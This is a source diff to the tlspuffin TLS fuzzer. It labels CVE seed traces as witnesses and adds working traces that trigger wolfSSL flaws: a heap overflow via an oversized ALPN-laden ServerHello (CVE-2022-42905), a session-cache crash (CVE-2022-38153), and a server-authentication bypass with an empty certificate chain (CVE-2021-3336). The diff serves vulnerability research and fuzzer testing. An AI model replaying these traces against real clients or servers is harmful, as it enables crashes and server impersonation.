@@ -2,8 +2,11 @@
 
 use puffin::agent::{AgentDescriptor, AgentName};
 use puffin::algebra::dynamic_function::TypeShape;
+use puffin::algebra::Term;
+use puffin::catalogue::WitnessRun;
+use puffin::outcome::Execution;
 use puffin::put_registry::Factory;
-use puffin::trace::{Action, InputAction, OutputAction, Step, Trace};
+use puffin::trace::{Action, ConfigTrace, InputAction, OutputAction, Step, Trace};
 use puffin::{input_action, term};
 
 use crate::protocol::{
@@ -46,6 +49,7 @@ pub fn create_corpus(
 }
 
 /// <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25638>
+#[puffin::witness("CVE-2022-25638")]
 pub fn seed_cve_2022_25638(server: AgentName) -> Trace<TLSProtocolTypes> {
     let client_hello = term! {
           fn_client_hello(
@@ -236,6 +240,7 @@ pub fn seed_cve_2022_25638(server: AgentName) -> Trace<TLSProtocolTypes> {
 }
 
 /// <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25640>
+#[puffin::witness("CVE-2022-25640")]
 pub fn seed_cve_2022_25640(server: AgentName) -> Trace<TLSProtocolTypes> {
     let client_hello = term! {
           fn_client_hello(
@@ -391,6 +396,7 @@ pub fn seed_cve_2022_25640(server: AgentName) -> Trace<TLSProtocolTypes> {
 }
 
 /// <https://nvd.nist.gov/vuln/detail/cve-2021-3449>
+#[puffin::witness("CVE-2021-3449")]
 pub fn seed_cve_2021_3449(server: AgentName) -> Trace<TLSProtocolTypes> {
     let (mut trace, client_verify_data) = _seed_client_attacker12(server);
 
@@ -626,6 +632,7 @@ pub fn seed_freak(client: AgentName, server: AgentName) -> Trace<TLSProtocolType
 }
 
 /// A simplified version of [`seed_cve_2022_25640`]
+#[puffin::witness("CVE-2022-25640")]
 pub fn seed_cve_2022_25640_simple(server: AgentName) -> Trace<TLSProtocolTypes> {
     let client_hello = term! {
           fn_client_hello(
@@ -840,6 +847,36 @@ pub fn seed_cve_2022_38153(client: AgentName, server: AgentName) -> Trace<TLSPro
 
 // Same as seed_cve_2022_38153 without the final fn_large_bytes_vec, to check whether we refind it
 // through bit-level mutations
+/// <https://nvd.nist.gov/vuln/detail/CVE-2022-38153> (CDOS)
+///
+/// The crash needs a session cache holding several **different** tickets, which a deterministic
+/// wolfSSL only gets from several handshakes run without reseeding its random generator: the
+/// witness first runs the TLS 1.2 handshake with tickets 50 times (the first one reseeded, as every
+/// execution), then `seed_cve_2022_38153`, in one process.
+#[puffin::witness("CVE-2022-38153")]
+pub fn witness_cve_2022_38153() -> WitnessRun<TLSProtocolTypes> {
+    use puffin::trace_helper::TraceHelper;
+
+    let handshake = seed_successful12_with_tickets.build_trace();
+    let without_reseed = ConfigTrace {
+        with_reseed: false,
+        ..ConfigTrace::default()
+    };
+
+    WitnessRun {
+        prelude: std::iter::once(Execution {
+            trace: handshake.clone(),
+            config: ConfigTrace::default(),
+        })
+        .chain((1..50).map(|_| Execution {
+            trace: handshake.clone(),
+            config: without_reseed,
+        }))
+        .collect(),
+        trace: seed_cve_2022_38153.build_trace(),
+    }
+}
+
 pub fn seed_cve_simple_2022_38153(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
     let new_session_ticket_payload = term! {
         fn_payload_u16(((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::NewSessionTicket)))]/Vec<u8>))
@@ -955,6 +992,7 @@ pub fn seed_cve_simple_2022_38153(client: AgentName, server: AgentName) -> Trace
     }
 }
 
+#[puffin::witness("CVE-2022-39173")]
 pub fn seed_cve_2022_39173(
     initial_server: AgentName,
     server: AgentName,
@@ -1113,6 +1151,7 @@ pub fn seed_cve_2022_39173(
     }
 }
 
+#[puffin::witness("CVE-2022-39173")]
 pub fn seed_cve_2022_39173_full(
     initial_server: AgentName,
     server: AgentName,
@@ -1255,6 +1294,7 @@ pub fn seed_cve_2022_39173_full(
     }
 }
 
+#[puffin::witness("CVE-2022-39173")]
 pub fn seed_cve_2022_39173_minimized(server: AgentName) -> Trace<TLSProtocolTypes> {
     // WAS REQUIRED: let initial_handshake = seed_client_attacker(initial_server);
 
@@ -1374,6 +1414,7 @@ pub fn seed_cve_2022_39173_minimized(server: AgentName) -> Trace<TLSProtocolType
 }
 
 /// <https://nvd.nist.gov/vuln/detail/CVE-2024-5814>
+#[puffin::witness("CVE-2024-5814")]
 pub fn seed_cve_2024_5814(client: AgentName) -> Trace<TLSProtocolTypes> {
     let selected_cipher_suite = term! { fn_excluded_cipher_suite };
     let server_hello = term! {
@@ -1536,6 +1577,265 @@ pub fn seed_cve_2024_5814(client: AgentName) -> Trace<TLSProtocolTypes> {
                             fn_seq_0,
                             ((client, 0)),
                             (@selected_cipher_suite)
+                        )
+                    }
+                }),
+            },
+        ],
+        ..Default::default()
+    }
+}
+
+/// <https://nvd.nist.gov/vuln/detail/CVE-2022-42905> (HEAP)
+///
+/// Rewritten from an objective of a VulnA HEAP campaign (bench task 1791301718922: tlspuffin
+/// 5c588ab, wolfSSL 5.4.0 with ASan), cut down to its first two steps. The wolfSSL client receives
+/// a ServerHello of about 17 KB, inflated by ALPN extensions carrying certificates and keys: the
+/// record does not fit wolfSSL's static input buffer and is read into a new heap buffer, and the
+/// message callback code of DoTls13HandShakeMsgType (WOLFSSL_CALLBACKS) copies the record header it
+/// expects 5 bytes before the message, before that buffer.
+#[puffin::witness("CVE-2022-42905")]
+pub fn seed_cve_2022_42905(client: AgentName) -> Trace<TLSProtocolTypes> {
+    let alice_key = term! { fn_payload_u8(fn_alice_key) };
+    let alice_cert = term! { fn_payload_u8(fn_alice_cert) };
+    let eve_cert = term! { fn_payload_u8(fn_eve_cert) };
+
+    let alpn = |payloads: &[&Term<TLSProtocolTypes>]| {
+        let mut list = term! { fn_empty_payload_u8_vec };
+        for payload in payloads {
+            list = term! { fn_append_payload_u8_vec((@list), (@payload)) };
+        }
+        term! { fn_al_protocol_server_negotiation((fn_make_payload_u8_vec_u16((@list)))) }
+    };
+
+    // the five ALPN extensions of the objective, in its order
+    let extensions = [
+        alpn(&[&eve_cert, &alice_key, &alice_cert]),
+        alpn(&[&alice_key, &eve_cert, &alice_key, &alice_cert]),
+        alpn(&[&alice_key, &eve_cert, &alice_key, &alice_cert]),
+        alpn(&[&alice_key, &eve_cert, &alice_key]),
+        alpn(&[&alice_key, &eve_cert, &alice_cert]),
+    ];
+    let mut server_extensions = term! { fn_server_extensions_new };
+    for extension in &extensions {
+        server_extensions =
+            term! { fn_server_extensions_append((@server_extensions), (@extension)) };
+    }
+
+    let server_hello = term! {
+        fn_server_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
+            fn_cipher_suite12,
+            fn_compression,
+            (fn_server_extensions_make((@server_extensions)))
+        )
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![TLSDescriptorConfig::new_client(client, TLSVersion::Both)],
+        steps: vec![
+            // Client Hello, Client -> Server
+            OutputAction::new_step(client),
+            // Server Hello of about 17 KB, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_hello }),
+            },
+        ],
+        ..Default::default()
+    }
+}
+
+/// <https://nvd.nist.gov/vuln/detail/CVE-2021-3336>
+///
+/// The attacker plays a TLS 1.3 server that sends an empty certificate chain, then a
+/// CertificateVerify signed with RSA-PSS and its Finished: before 4.7.0, wolfSSL's
+/// DoTls13CertificateVerify only logs that no RSA key came with the peer's certificate and goes on,
+/// and the client completes the handshake with an unauthenticated server.
+#[puffin::witness("CVE-2021-3336")]
+pub fn seed_server_attacker_full_cve_2021_3336(client: AgentName) -> Trace<TLSProtocolTypes> {
+    let curve = term! {
+        fn_get_any_client_curve(
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))])
+        )
+    };
+
+    let server_hello = term! {
+          fn_server_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
+            fn_cipher_suite13_aes_128_gcm_sha256,
+            fn_compression,
+            (fn_server_extensions_make(
+              (fn_server_extensions_append(
+                  (fn_server_extensions_append(
+                      fn_server_extensions_new,
+                      (fn_key_share_server_extension(
+                          (fn_key_share_deterministic((@curve)))
+                      ))
+                  )),
+                  fn_supported_versions13_server_extension
+            ))))
+        )
+    };
+
+    let server_hello_transcript = term! {
+        fn_append_transcript(
+            (fn_append_transcript(
+                fn_new_transcript,
+                ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]) // ClientHello
+            )),
+            (@server_hello) // plaintext ServerHello
+        )
+    };
+
+    let encrypted_extensions = term! {
+        fn_encrypted_extensions(
+            fn_server_extensions_new
+        )
+    };
+
+    let certificate = term! {
+        fn_certificate13(
+            (fn_payload_u8((fn_empty_bytes_vec))),
+            (fn_certificate_entries_make(fn_empty_certificate_chain))
+        )
+    };
+
+    let encrypted_extensions_transcript = term! {
+        fn_append_transcript(
+            (@server_hello_transcript),
+            (@encrypted_extensions) // plaintext EncryptedExtensions
+        )
+    };
+
+    let certificate_transcript = term! {
+        fn_append_transcript(
+            (@encrypted_extensions_transcript),
+            (@certificate) // plaintext Certificate
+        )
+    };
+
+    let certificate_verify = term! {
+        fn_certificate_verify(
+            fn_rsa_pss_signature_algorithm,
+            (fn_payload_u16(
+                (fn_rsa_sign_server(
+                    (@certificate_transcript),
+                    fn_alice_key,
+                    fn_rsa_pss_signature_algorithm
+                ))
+            ))
+        )
+    };
+
+    let certificate_verify_transcript = term! {
+        fn_append_transcript(
+            (@certificate_transcript),
+            (@certificate_verify) // plaintext CertificateVerify
+        )
+    };
+
+    let server_finished = term! {
+        fn_finished(
+            (fn_verify_data_server(
+                (@certificate_verify_transcript),
+                //(fn_server_finished_transcript(((client, 0)))),
+                (@server_hello_transcript),
+                (fn_get_client_key_share(((client, 0)), (@curve))),
+                (@curve),
+                fn_no_psk,
+                fn_new_random,
+                fn_cipher_suite13_aes_128_gcm_sha256
+            ))
+        )
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor::from_config(
+            client,
+            TLSDescriptorConfig {
+                tls_version: TLSVersion::V1_3,
+                typ: AgentType::Client,
+                ..TLSDescriptorConfig::default()
+            },
+        )],
+        steps: vec![
+            OutputAction::new_step(client),
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_hello
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@encrypted_extensions),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_0,  // sequence 0
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@certificate),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_1,  // sequence 1
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@certificate_verify),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_2,  // sequence 2
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@server_finished),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_3,  // sequence 3
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
                         )
                     }
                 }),
